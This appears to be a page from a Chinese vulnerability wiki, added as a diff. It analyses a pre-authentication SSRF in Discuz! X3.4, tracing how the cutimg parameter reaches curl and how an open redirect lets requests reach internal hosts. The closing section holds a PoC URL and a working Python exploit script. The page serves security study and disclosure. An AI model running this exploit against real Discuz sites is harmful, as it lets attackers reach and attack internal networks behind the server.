@@ -1,0 +1,229 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Discuz/Discuz%21%20X3.4%20%E5%89%8D%E5%8F%B0ssrf/">
+    <link rel="shortcut icon" href="../../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>Discuz! X3.4 前台ssrf - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "Discuz! X3.4 \u524d\u53f0ssrf", url: "#_top", children: [
+              {title: "\u4e00\u3001\u6f0f\u6d1e\u7b80\u4ecb", url: "#_1" },
+              {title: "\u4e8c\u3001\u6f0f\u6d1e\u5f71\u54cd", url: "#_2" },
+              {title: "\u4e09\u3001\u590d\u73b0\u8fc7\u7a0b", url: "#_3" },
+              {title: "\u53c2\u8003\u94fe\u63a5", url: "#_5" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../../js/base.js"></script>
+      <script src="../../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="btn btn-xs btn-link">
+        Discuz! X3.4 后台任意文件删除
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/" class="btn btn-xs btn-link">
+        Discuz! X3.4 任意文件删除配合install过程getshell
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="discuz-x34-ssrf">Discuz! X3.4 前台ssrf<a class="headerlink" href="#discuz-x34-ssrf" title="Permanent link">&para;</a></h1>
+<h2 id="_1">一、漏洞简介<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>DDiscuz! X3.4
+source/module/misc/misc_imgcropper.php页面中的cutimg参数，因为应用程序的远程下载功能过滤不严，配合前台任意URL跳转漏洞，可以造成SSRF漏洞，可以对与外部隔离的内部环境进行探测和攻击</p>
+<h2 id="_2">二、漏洞影响<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<ul>
+<li>
+<p>\&lt;= x3.4</p>
+</li>
+<li>
+<p>windows</p>
+</li>
+<li>
+<p>php&gt;5.3+php-curl\&lt;=7.54</p>
+</li>
+<li>
+<p>DZ开放在80端口</p>
+</li>
+</ul>
+<h2 id="_3">三、复现过程<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<h3 id="_4">漏洞分析<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h3>
+<p><strong>本地ssrf</strong></p>
+<p>/source/module/misc/misc_imgcropper.php 55行</p>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="n">require_once</span><span class="w"> </span><span class="n">libfile</span><span class="p">(</span><span class="s">&#39;class/image&#39;</span><span class="p">);</span><span class="w">    </span><span class="err">$</span><span class="n">image</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">new</span><span class="w"> </span><span class="n">image</span><span class="p">();</span><span class="w">   </span><span class="err">$</span><span class="n">prefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">&#39;picflag&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="err">$</span><span class="n">_G</span><span class="p">[</span><span class="s">&#39;setting&#39;</span><span class="p">][</span><span class="s">&#39;ftp&#39;</span><span class="p">][</span><span class="s">&#39;attachurl&#39;</span><span class="p">]</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="err">$</span><span class="n">_G</span><span class="p">[</span><span class="s">&#39;setting&#39;</span><span class="p">][</span><span class="s">&#39;attachurl&#39;</span><span class="p">];</span><span class="w"> </span><span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="err">$</span><span class="n">image</span><span class="o">-&gt;</span><span class="n">Thumb</span><span class="p">(</span><span class="err">$</span><span class="n">prefix</span><span class="p">.</span><span class="err">$</span><span class="n">_GET</span><span class="p">[</span><span class="s">&#39;cutimg&#39;</span><span class="p">],</span><span class="w"> </span><span class="err">$</span><span class="n">cropfile</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">picwidth</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">picheight</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">      </span><span class="n">showmessage</span><span class="p">(</span><span class="s">&#39;imagepreview_errorcode_&#39;</span><span class="p">.</span><span class="err">$</span><span class="n">image</span><span class="o">-&gt;</span><span class="n">errorcode</span><span class="p">,</span><span class="w"> </span><span class="n">null</span><span class="p">,</span><span class="w"> </span><span class="n">null</span><span class="p">,</span><span class="w"> </span><span class="n">array</span><span class="p">(</span><span class="s">&#39;showdialog&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kr">true</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;closetime&#39;</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="kr">true</span><span class="p">));</span><span class="w">    </span><span class="p">}</span>
+<span class="err">$</span><span class="n">prefix</span><span class="err">`可以通过</span><span class="n">GET传递</span><span class="err">`$</span><span class="n">_GET</span><span class="p">[</span><span class="s">&#39;picflag&#39;</span><span class="p">]</span><span class="err">`为</span><span class="mi">2</span><span class="err">进行三元操作，变成了默认的`</span><span class="o">/</span><span class="err">`，然后和`$</span><span class="n">_GET</span><span class="p">[</span><span class="s">&#39;cutimg&#39;</span><span class="p">]</span><span class="err">`进行拼接作为第一个参数传进了`$</span><span class="n">image</span><span class="o">-&gt;</span><span class="n">Thumb</span>
+</code></pre></div>
+
+<p>source/class/class_image.php 51行</p>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nx">function</span><span class="w"> </span><span class="nx">Thumb</span><span class="p">(</span><span class="err">$</span><span class="nx">source</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">thumbwidth</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">thumbheight</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">thumbtype</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">nosuffix</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">        </span><span class="err">$</span><span class="k">return</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">$</span><span class="nx">this</span><span class="o">-&gt;</span><span class="nx">init</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">thumb</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">source</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">target</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">nosuffix</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+</code></pre></div>
+
+<p>拼接后的参数作为<code>$source</code>又传进了init函数</p>
+<p>source/class/class_image.php 118行</p>
+<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="kr">function</span><span class="w"> </span><span class="n">init</span><span class="p">(</span><span class="err">$</span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">target</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">nosuffix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">       </span><span class="kr">global</span><span class="w"> </span><span class="err">$</span><span class="n">_G</span><span class="p">;</span><span class="w">     </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">errorcode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">source</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">            </span><span class="kr">return</span><span class="w"> </span><span class="o">-</span><span class="mi">2</span><span class="p">;</span><span class="w">      </span><span class="p">}</span><span class="w">       </span><span class="err">$</span><span class="nf">parse</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parse_url</span><span class="p">(</span><span class="err">$</span><span class="n">source</span><span class="p">);</span><span class="w">        </span><span class="nf">if</span><span class="p">(</span><span class="n">isset</span><span class="p">(</span><span class="err">$</span><span class="nf">parse</span><span class="p">[</span><span class="s">&#39;host&#39;</span><span class="p">]))</span><span class="w"> </span><span class="p">{</span><span class="w">         </span><span class="nf">if</span><span class="p">(</span><span class="n">empty</span><span class="p">(</span><span class="err">$</span><span class="n">target</span><span class="p">))</span><span class="w"> </span><span class="p">{</span><span class="w">                </span><span class="kr">return</span><span class="w"> </span><span class="o">-</span><span class="mi">2</span><span class="p">;</span><span class="w">          </span><span class="p">}</span><span class="w">           </span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">dfsockopen</span><span class="p">(</span><span class="err">$</span><span class="n">source</span><span class="p">);</span><span class="w">            </span><span class="err">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">tmpfile</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="err">$</span><span class="n">source</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">tempnam</span><span class="p">(</span><span class="err">$</span><span class="n">_G</span><span class="p">[</span><span class="s">&#39;setting&#39;</span><span class="p">][</span><span class="s">&#39;attachdir&#39;</span><span class="p">].</span><span class="s">&#39;./temp/&#39;</span><span class="p">,</span><span class="w"> </span><span class="s">&#39;tmpimg_&#39;</span><span class="p">);</span><span class="w">            </span><span class="nf">if</span><span class="p">(</span><span class="o">!</span><span class="err">$</span><span class="kt">data</span><span class="w"> </span><span class="o">||</span><span class="w"> </span><span class="err">$</span><span class="n">source</span><span class="w"> </span><span class="o">===</span><span class="w"> </span><span class="kr">FALSE</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">               </span><span class="kr">return</span><span class="w"> </span><span class="o">-</span><span class="mi">2</span><span class="p">;</span><span class="w">          </span><span class="p">}</span><span class="w">           </span><span class="n">file_put_contents</span><span class="p">(</span><span class="err">$</span><span class="n">source</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="n">data</span><span class="p">);</span><span class="w">      </span><span class="p">}</span>
+</code></pre></div>
+
+<p>可以发现如果<code>$source</code>经过<code>parse_url</code>的解析结果中如果包含host字段就不结束流程，然后将<code>$source</code>参数传入<code>dfsockopen</code>函数。Php中的<code>parse_url</code>函数是可以对<code>//</code>开头的域名进行解析的,
+<code>$source</code>本身就是<code>/</code>开头，因此只需要通过开始的<code>$_GET['cutimg']</code>注入<code>/www.0-sec.org，变成</code>//<a href="http://www.0-sec.org">www.0-sec.org</a>`即可继续执行。</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId25.png" /></p>
+<p>source/function/function_core.php 199行</p>
+<div class="codehilite"><pre><span></span><code><span class="nx">function</span><span class="w"> </span><span class="nx">dfsockopen</span><span class="p">(</span><span class="err">$</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">limit</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">post</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">cookie</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">bysocket</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">FALSE</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">ip</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">timeout</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">15</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">block</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">TRUE</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">encodetype</span><span class="w">  </span><span class="p">=</span><span class="w"> </span><span class="err">&#39;</span><span class="nx">URLENCODE</span><span class="err">&#39;</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">allowcurl</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">TRUE</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">position</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">files</span><span class="w"> </span><span class="p">=</span><span class="w"> </span><span class="nx">array</span><span class="p">())</span><span class="w"> </span><span class="p">{</span><span class="w">    </span><span class="nx">require_once</span><span class="w"> </span><span class="nx">libfile</span><span class="p">(</span><span class="err">&#39;</span><span class="nx">function</span><span class="o">/</span><span class="nx">filesock</span><span class="err">&#39;</span><span class="p">);</span><span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="nx">_dfsockopen</span><span class="p">(</span><span class="err">$</span><span class="nx">url</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">limit</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">post</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">cookie</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">bysocket</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">ip</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">timeout</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">block</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">encodetype</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">allowcurl</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">position</span><span class="p">,</span><span class="w"> </span><span class="err">$</span><span class="nx">files</span><span class="p">);}</span>
+</code></pre></div>
+
+<p>进入dfsockopen函数后，我们构造的字符串变为$url，然后传入了_dfsockopen函数。</p>
+<p>dz/source/function/function_filesock.php 31行</p>
+<p>image</p>
+<p>发起了curl请求，就是这里触发了ssrf，这里的现有使用后parse_url解析了一次$url，和上面的解析是一样的，然后又进行了拼接成为了curl的地址。</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId26.png" /></p>
+<p>其$scheme为空，如果我们为cutimg传入/dz//member.php，那么到就会变成://dz//member.php</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId27.png" /></p>
+<p>在php的curl中我们尝试访问://dz/forum.php</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId28.png" /></p>
+<p>可以发现无指定协议的默认就是http协议，://是代表访问本地dz/forum.php表示路径和path，因此能够访问首页，到这里就有了一个可以对通网站下进行ssrf的漏洞点。</p>
+<p>Curl的配置当中开启了跳转</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId29.png" /></p>
+<p>再找到一个站内的url跳转，就能绕过站内curl的限制，实现真正的ssrf。</p>
+<h3 id="url">前台任意url跳转<a class="headerlink" href="#url" title="Permanent link">&para;</a></h3>
+<p>/source/class/class_member.php 310行</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId31.png" /></p>
+<p>调用了dreferer()结果作为跳转地址，继续跟进该函数。</p>
+<p>source/function/function_core.php 1498行</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId32.png" /></p>
+<p><code>$_G['referer']</code>这个参数我们可控，同样使用了<code>parse_url</code>进行了解析，首先对协议进行了判断，需要属于<code>http/https</code>。</p>
+<p>然后又对host字段和<code>$_SERVER['HTTP_HOST']</code>进行了对比，判断是否在同一个域名下，因为攻击中是通过curl发起的请求，$_SERVER['HTTP_HOST']此时为空，但是和www.进行了，因此这里域名为<code>www.</code>即可绕过判断成功注入location字段</p>
+<p>此时处理跳转的是php的curl，curl这里会因为<code>#@</code>出现解析问题，会跳转到192.168.2.63:6666，也就是形成ssrf。</p>
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId33.png" /></p>
+<p>站内ssrf-&gt;前台get型的任意url跳转-&gt;ssrf漏洞</p>
+<p><strong>总结</strong>：</p>
+<p>因为应用程序的远程下载功能过滤不严，利用php中的parse_url还有curl解析特性，配合前台任意URL跳转漏洞，可以造成SSRF漏洞。</p>
+<h3 id="poc">poc<a class="headerlink" href="#poc" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="n">htp</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="o">.</span><span class="mi">0</span><span class="o">-</span><span class="n">sec</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">code</span><span class="o">-</span><span class="n">src</span><span class="o">/</span><span class="n">dz</span><span class="o">/</span><span class="n">Discuz_TC_BIG5</span><span class="o">/</span><span class="n">upload</span><span class="o">/</span><span class="n">member</span><span class="o">.</span><span class="n">php</span><span class="err">?</span><span class="n">mod</span><span class="o">=</span><span class="n">logging</span><span class="o">&amp;</span><span class="n">action</span><span class="o">=</span><span class="n">logout</span><span class="o">&amp;</span><span class="n">XDEBUG_SESSION_START</span><span class="o">=</span><span class="mi">13904</span><span class="o">&amp;</span><span class="n">referer</span><span class="o">=</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="o">%</span><span class="mi">23</span><span class="o">%</span><span class="mi">40</span><span class="n">www</span><span class="o">.</span><span class="n">baidu</span><span class="o">.</span><span class="n">com</span><span class="o">&amp;</span><span class="n">quickforward</span><span class="o">=</span><span class="mi">1</span>
+</code></pre></div>
+
+<h3 id="python">python 脚本<a class="headerlink" href="#python" title="Permanent link">&para;</a></h3>
+<div class="codehilite"><pre><span></span><code><span class="c1"># coding=utf-8</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
+<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urlparse</span><span class="p">,</span> <span class="n">quote</span>
+<span class="kn">from</span><span class="w"> </span><span class="nn">urllib</span><span class="w"> </span><span class="kn">import</span> <span class="n">parse</span>
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;http://192.168.66.129/dz/&quot;</span>
+    <span class="n">ssrf_target</span> <span class="o">=</span> <span class="s2">&quot;192.168.0.36:6666&quot;</span>
+    <span class="n">path</span> <span class="o">=</span> <span class="n">urlparse</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">path</span>
+    <span class="n">payload</span> <span class="o">=</span> <span class="n">quote</span><span class="p">(</span>
+        <span class="s2">&quot;/member.php?mod=logging&amp;action=logout&amp;quickforward=1&amp;referer=http://www.</span><span class="si">%23%</span><span class="s2">40</span><span class="si">{ssrf_target}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+            <span class="n">ssrf_target</span><span class="o">=</span><span class="n">ssrf_target</span><span class="p">))</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>
+    <span class="n">html</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+    <span class="n">searchObj</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;name=&quot;formhash&quot; value=&quot;(.*?)&quot;&#39;</span><span class="p">,</span> <span class="n">html</span><span class="p">,</span> <span class="n">re</span><span class="o">.</span><span class="n">M</span> <span class="o">|</span> <span class="n">re</span><span class="o">.</span><span class="n">I</span><span class="p">)</span>
+    <span class="n">formhash</span> <span class="o">=</span> <span class="n">searchObj</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="n">rs</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span>
+        <span class="n">url</span> <span class="o">+</span> <span class="s2">&quot;misc.php?mod=imgcropper&amp;imgcroppersubmit=1&amp;formhash=</span><span class="si">{formhash}</span><span class="s2">&amp;picflag=2&amp;cutimg=</span><span class="si">{path}{payload}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span>
+            <span class="n">formhash</span><span class="o">=</span><span class="n">formhash</span><span class="p">,</span> <span class="n">path</span><span class="o">=</span><span class="n">path</span><span class="p">,</span> <span class="n">payload</span><span class="o">=</span><span class="n">payload</span><span class="p">))</span>
+    <span class="n">exit</span><span class="p">()</span>
+</code></pre></div>
+
+<p><img alt="" src="../resource/Discuz%21X3.4%E5%89%8D%E5%8F%B0ssrf/media/rId36.png" /></p>
+<h2 id="_5">参考链接<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p><a href="http://www.rai4over.cn/2018/12/07/Discuz-3-4前台有限制SSRF漏洞/index.html">http://www.rai4over.cn/2018/12/07/Discuz-3-4%E5%89%8D%E5%8F%B0%E6%9C%89%E9%99%90%E5%88%B6SSRF%E6%BC%8F%E6%B4%9E/index.html</a></p>
+</blockquote>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../Discuz%21%20X3.4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../Discuz%21%20X3.4%20%E5%90%8E%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4/" class="btn btn-xs btn-link">
+        Discuz! X3.4 后台任意文件删除
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Discuz%21%20X3.4%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E9%85%8D%E5%90%88install%E8%BF%87%E7%A8%8Bgetshell/" class="btn btn-xs btn-link">
+        Discuz! X3.4 任意文件删除配合install过程getshell
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
